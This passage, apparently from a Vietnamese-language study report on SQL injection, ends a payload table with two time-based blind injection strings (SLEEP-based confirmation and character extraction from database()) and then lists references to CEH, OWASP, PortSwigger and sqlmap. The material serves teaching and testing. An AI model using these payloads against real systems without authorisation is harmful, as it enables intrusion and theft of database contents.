| Time        | `AND IF(1=1,SLEEP(3),0)`                                                                                        | Confirm injection qua delay |
| Time        | `AND IF(SUBSTRING(database(),1,1)='v',SLEEP(3),0)`                                                              | Lấy ký tự qua delay         |

### B. Tài liệu tham khảo

1. EC-Council. CEH v12 - Module 15: SQL Injection
2. OWASP. SQL Injection Prevention Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
3. PortSwigger. SQL Injection - https://portswigger.net/web-security/sql-injection
4. sqlmap Documentation - https://sqlmap.org/
5. OWASP Testing Guide - Testing for SQL Injection - https://owasp.org/www-project-web-security-testing-guide/
